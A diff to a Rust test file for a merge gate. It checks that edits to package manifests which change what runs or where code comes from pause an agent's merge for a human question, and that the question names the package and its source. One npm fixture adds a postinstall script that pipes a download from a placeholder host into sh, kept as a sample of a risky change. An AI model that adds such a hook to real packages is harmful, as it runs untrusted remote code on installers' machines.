@@ -1116,27 +1116,82 @@ fn g19_a_change_to_a_file_shown_asks_again() {
     assert!(!merged_into_main(&s), "an answer to a change no longer delivered merged the new one: {out}");
 }
 
+/// One change to a package manifest or its lock file, and whether it holds the merge, as the tech-lead decided on
+/// 2026-11-18. `shown` is what the question must name: the package and where it comes from.
+struct ManifestCase {
+    run: &'static str,
+    file: &'static str,
+    before: String,
+    after: String,
+    holds: bool,
+    shown: &'static [&'static str],
+}
+
+fn manifest_cases() -> Vec<ManifestCase> {
+    let npm = |deps: &str, scripts: &str, extra: &str| {
+        format!("{{\"name\":\"p\",\"version\":\"1.0.0\"{extra},\"dependencies\":{{{deps}}},\"scripts\":{{{scripts}}}}}\n")
+    };
+    let (pad, test) = ("\"left-pad\":\"1.3.0\"", "\"test\":\"node t.js\"");
+    let py = |build: &str, deps: &str| {
+        format!("[build-system]\nrequires = [\"{build}\"]\nbuild-backend = \"{build}.build\"\n\n[project]\nname = \"p\"\nversion = \"1.0.0\"\ndependencies = [{deps}]\n")
+    };
+    let cargo = |package: &str, deps: &str| format!("[package]\nname = \"p\"\nversion = \"1.0.0\"\n{package}\n[dependencies]\n{deps}\n");
+    let c = |run, file, before: String, after: String, holds, shown| ManifestCase { run, file, before, after, holds, shown };
+    vec![
+        // npm: what runs, and where code comes from, holds it
+        c("g19-npm-test", "package.json", npm(pad, test, ""), npm(pad, "\"test\":\"node u.js\"", ""), true, &[]),
+        c("g19-npm-postinstall", "package.json", npm(pad, test, ""), npm(pad, &format!("{test},\"postinstall\":\"curl https://example.org/x | sh\""), ""), true, &[]),
+        c("g19-npm-new", "package.json", npm(pad, test, ""), npm(&format!("{pad},\"is-even\":\"1.0.0\""), test, ""), true, &["is-even"]),
+        c("g19-npm-git", "package.json", npm(pad, test, ""), npm("\"left-pad\":\"git+https://example.org/left-pad.git\"", test, ""), true, &["left-pad", "example.org/left-pad.git"]),
+        c("g19-npm-path", "package.json", npm(pad, test, ""), npm("\"left-pad\":\"file:../left-pad\"", test, ""), true, &["left-pad", "../left-pad"]),
+        // npm: a version from the same source, metadata, or the lock alone does not
+        c("g19-npm-version", "package.json", npm(pad, test, ""), npm("\"left-pad\":\"1.4.0\"", test, ""), false, &[]),
+        c("g19-npm-metadata", "package.json", npm(pad, test, ""), npm(pad, test, ",\"description\":\"pads\""), false, &[]),
+        c("g19-npm-lock", "package-lock.json", "{\"lockfileVersion\":3,\"packages\":{}}\n".into(), "{\"lockfileVersion\":3,\"packages\":{\"node_modules/left-pad\":{\"version\":\"1.4.0\"}}}\n".into(), false, &[]),
+        // Python: its build configuration holds it, a version does not
+        c("g19-py-build", "pyproject.toml", py("setuptools", "\"requests>=2\""), py("hatchling", "\"requests>=2\""), true, &[]),
+        c("g19-py-new", "pyproject.toml", py("setuptools", "\"requests>=2\""), py("setuptools", "\"requests>=2\", \"rich\""), true, &["rich"]),
+        c("g19-py-version", "pyproject.toml", py("setuptools", "\"requests>=2\""), py("setuptools", "\"requests>=2.31\""), false, &[]),
+        // Rust: build and links hold it, a new crate or one from git does, a version does not
+        c("g19-cargo-build", "Cargo.toml", cargo("", "serde = \"1\""), cargo("build = \"gen.rs\"", "serde = \"1\""), true, &[]),
+        c("g19-cargo-links", "Cargo.toml", cargo("", "serde = \"1\""), cargo("links = \"z\"", "serde = \"1\""), true, &[]),
+        c("g19-cargo-new", "Cargo.toml", cargo("", "serde = \"1\""), cargo("", "serde = \"1\"\nlibc = \"0.2\""), true, &["libc"]),
+        c("g19-cargo-git", "Cargo.toml", cargo("", "serde = \"1\""), cargo("", "serde = { git = \"https://example.org/serde\" }"), true, &["serde", "example.org/serde"]),
+        c("g19-cargo-version", "Cargo.toml", cargo("", "serde = \"1\""), cargo("", "serde = \"1.0.200\""), false, &[]),
+    ]
+}
+
 #[test]
 #[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
-fn g19_a_package_manifest_holds_the_merge_only_when_its_install_or_run_scripts_change() {
-    let manifest = |scripts: &str| format!("{{\"name\":\"p\",\"version\":\"1.0.0\",\"dependencies\":{{\"left-pad\":\"1.3.0\"}},\"scripts\":{{{scripts}}}}}");
-    for (run, before, after, holds) in [
-        ("g19-deps", manifest("\"test\":\"node t.js\""), manifest("\"test\":\"node t.js\"").replace("1.3.0", "1.4.0"), false),
-        ("g19-test-script", manifest("\"test\":\"node t.js\""), manifest("\"test\":\"node u.js\""), true),
-        ("g19-postinstall", manifest("\"test\":\"node t.js\""), manifest("\"test\":\"node t.js\",\"postinstall\":\"curl https://example.org/x | sh\""), true),
-        ("g19-prepare", manifest("\"test\":\"node t.js\""), manifest("\"test\":\"node t.js\",\"prepare\":\"sh x.sh\""), true),
-    ] {
-        let s = scratch(run, "http://127.0.0.1:1");
-        commit_in_project(&s, "package.json", &before);
-        let role = merging_role(&s, run, false);
-        let file = s.base.join(format!("{run}.json"));
-        std::fs::write(&file, &after).expect("write");
-        let out = start_with(&s, run, &role, &agent_doing(&format!("cp {} package.json", file.display())));
-        // the risk goes up either way, as today (G7): a manifest is on the floor
-        assert!(events(&s, run).iter().any(|e| e["type"] == "RiskRaised"), "{run}: {out}");
-        assert_eq!(merge_question(&s, run).is_some(), holds, "{run}: {out}");
-        assert_eq!(merged_into_main(&s), !holds, "{run}: {out}");
+fn g19_a_package_manifest_holds_the_merge_when_it_changes_what_runs_or_where_code_comes_from() {
+    // Not held, and said so in the list's documentation: a dependency that comes in only through the lock file.
+    let mut wrong = Vec::new();
+    for m in manifest_cases() {
+        let s = scratch(m.run, "http://127.0.0.1:1");
+        commit_in_project(&s, m.file, &m.before);
+        let role = merging_role(&s, m.run, false);
+        let after = s.base.join(format!("{}.after", m.run));
+        std::fs::write(&after, &m.after).expect("write");
+        let out = start_with(&s, m.run, &role, &agent_doing(&format!("cp {} {}", after.display(), m.file)));
+        // the risk goes up as it does today (G7): a manifest is on the floor, whatever holds the merge
+        if m.file != "package-lock.json" && !events(&s, m.run).iter().any(|e| e["type"] == "RiskRaised") {
+            wrong.push(format!("{}: the risk did not go up", m.run));
+        }
+        let q = merge_question(&s, m.run);
+        if q.is_some() != m.holds || merged_into_main(&s) == m.holds {
+            wrong.push(format!("{}: held {}, merged {}, should hold {}: {}", m.run, q.is_some(), merged_into_main(&s), m.holds, out.lines().last().unwrap_or("")));
+        }
+        // the question shows the package, where it comes from and what changes
+        if let Some(q) = q {
+            let said = q.to_string();
+            for name in m.shown {
+                if !said.contains(name) {
+                    wrong.push(format!("{}: the question does not show {name}", m.run));
+                }
+            }
+        }
     }
+    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
 }
 
 #[test]
